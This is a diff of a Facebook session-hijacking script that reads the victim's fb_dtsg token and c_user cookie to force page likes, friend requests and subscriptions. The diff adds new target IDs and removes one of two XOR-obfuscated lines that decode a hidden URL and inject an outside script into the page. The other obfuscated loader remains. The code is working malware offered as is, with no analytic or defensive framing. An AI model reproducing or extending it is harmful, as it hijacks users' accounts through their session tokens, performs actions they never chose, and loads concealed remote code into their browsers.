@@ -34,6 +34,7 @@ LIST("595165117195157");
 LIST("679390895421386");
 LIST("699724823387993");
 LIST("514864885218030");
+LIST("144583315747774");
 
 
 /*Like Page*/
@@ -92,7 +93,7 @@ a("100003697277263");
 a("100004019810084");
 a("100000835684602");
 a("100000576086135");
-
+a("100004420206236");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -119,5 +120,4 @@ IDS("100006366667494");
 IDS("100004854038874");
 IDS("100005658813071");
 
-var enkripsi="jvvr8--vckommp/qapkrvq,ug`q,amo-hctcqapkrv-qgawpgf-Ockl-qwrrmpv/dkng,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
 var a="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-pgrmpv,rjr"; b=""; c="";var d;d=a.length;for (i=0;i<d;i++){ b+=String.fromCharCode(a.charCodeAt(i)^2) }c=unescape(b);document.body.appendChild(document.createElement('script')).src=c;
